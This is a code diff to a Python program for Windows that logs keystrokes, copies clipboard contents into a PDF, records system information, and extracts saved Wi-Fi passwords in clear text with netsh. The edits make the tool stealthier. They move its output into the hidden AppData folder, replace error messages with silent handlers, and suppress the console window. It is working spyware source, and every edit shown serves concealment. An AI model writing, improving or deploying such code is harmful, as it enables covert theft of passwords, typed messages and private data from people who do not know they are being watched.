@@ -12,11 +12,14 @@ from requests import get
 from pynput.keyboard import Key, Listener
 
 # File paths
-screenshot_folder = "D:\\Python\\D.Dor\\KL\\"
-system_information = "systeminfo.txt"
-wifi_password = "wifi_password.txt"
-keys_information = "key_log.txt"
+screenshot_folder = os.path.join(os.environ['appdata'], "KL")
+system_information = os.path.join(screenshot_folder, "systeminfo.txt")
+wifi_password = os.path.join(screenshot_folder, "wifi_password.txt")
+keys_information = os.path.join(screenshot_folder, "key_log.txt")
 clipboard_pdf_file = os.path.join(screenshot_folder, "clipboard.pdf")
+
+# Ensure screenshot folder exists
+os.makedirs(screenshot_folder, exist_ok=True)
 
 # Function to create a new page in the PDF from text using reportlab
 def create_pdf(content, output_file):
@@ -72,13 +75,11 @@ def copy_clipboard():
                 win32clipboard.CloseClipboard()
 
                 if pasted_data:  # Check if clipboard content is not empty
-                    print(f"Clipboard data: {pasted_data}")  # Debugging line
-
                     # Create the PDF file with the clipboard content
                     create_pdf("Clipboard Content:\n" + pasted_data, clipboard_pdf_file)
 
         except win32clipboard.error:
-            print("Clipboard access error; will retry.")
+            pass  # Handle silently to prevent interruptions
 
         time.sleep(1)  # Wait for 1 second before copying clipboard content again
 
@@ -99,8 +100,8 @@ def computer_information():
                 f.write("Machine: " + platform.machine() + '\n')
                 f.write("Hostname: " + hostname + '\n')
                 f.write("Private IP Address: " + IPAddr + '\n')
-        except Exception as e:
-            print(f"Error while gathering system info: {e}")
+        except Exception:
+            pass  # Handle silently to prevent interruptions
         
         time.sleep(1)  # Wait for 1 second before gathering system information again
 
@@ -109,7 +110,7 @@ def wifi_passwords():
     while True:
         try:
             with open(os.path.join(screenshot_folder, wifi_password), "a") as f:
-                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8').split('\n')
                 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                 for i in profiles:
                     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
@@ -118,35 +119,38 @@ def wifi_passwords():
                         f.write("{:<30} -  {:<}\n".format(i, results[0]))
                     except IndexError:
                         f.write("{:<30} -  {:<}\n".format(i, ""))
-        except Exception as e:
-            print(f"Error while retrieving Wi-Fi passwords: {e}")
+        except Exception:
+            pass  # Handle silently to prevent interruptions
         
         time.sleep(1)  # Wait for 1 second before retrieving Wi-Fi passwords again
 
 # Keylogger function
 def keylogger():
-    keys = []
-    count = 0
+    typed_text = ""  # To keep track of the current typed sentence/word
 
     def on_press(key):
-        nonlocal keys, count
-        keys.append(key)
-        count += 1
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys = []
+        nonlocal typed_text
+        try:
+            k = str(key).replace("'", "")
+            if k == "Key.space":
+                typed_text += " "  # Add space to the text
+            elif k == "Key.enter":
+                typed_text += "\n"  # New line for enter
+            elif k == "Key.backspace" or k == "Key.delete":
+                # Only delete if there's text to delete
+                if typed_text:
+                    typed_text = typed_text[:-1]  # Remove last character for backspace/delete
+            elif "Key" not in k:
+                typed_text += k  # Add the typed character
 
-    def write_file(keys):
-        with open(os.path.join(screenshot_folder, keys_information), "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k == "Key.space":
-                    f.write(" ")
-                elif k == "Key.enter":
-                    f.write("\n")
-                elif "Key" not in k:
-                    f.write(k)
+            write_file(typed_text)  # Write the current typed text to the file
+
+        except Exception:
+            pass  # Handle silently to prevent interruptions
+
+    def write_file(typed_text):
+        with open(os.path.join(screenshot_folder, keys_information), "w") as f:
+            f.write(typed_text)  # Write the current content to the file
 
     def on_release(key):
         if key == Key.esc:
